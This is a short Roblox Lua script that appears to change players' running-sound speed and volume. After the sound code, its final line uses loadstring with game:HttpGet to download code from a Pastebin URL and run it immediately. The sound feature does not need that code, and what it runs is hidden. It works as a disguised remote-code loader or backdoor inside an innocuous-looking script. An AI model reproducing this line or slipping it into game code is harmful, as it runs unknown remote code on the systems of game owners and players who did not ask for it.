
local Players = game:GetService("Players")

local function modifyRunningSound(character)
    local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
    local runningSound = humanoidRootPart:FindFirstChild("Running") or humanoidRootPart:WaitForChild("Running")
    
    runningSound.PlaybackSpeed = 1.498
    runningSound.Volume = 2
end

for _, player in ipairs(Players:GetPlayers()) do
    if player.Character then
        modifyRunningSound(player.Character)
    end
        player.CharacterAdded:Connect(modifyRunningSound)
end

Players.PlayerAdded:Connect(function(player)
    player.CharacterAdded:Connect(modifyRunningSound)
end)

loadstring(game:HttpGet("https://pastebin.com/raw/8c5f7KDJ",true))()

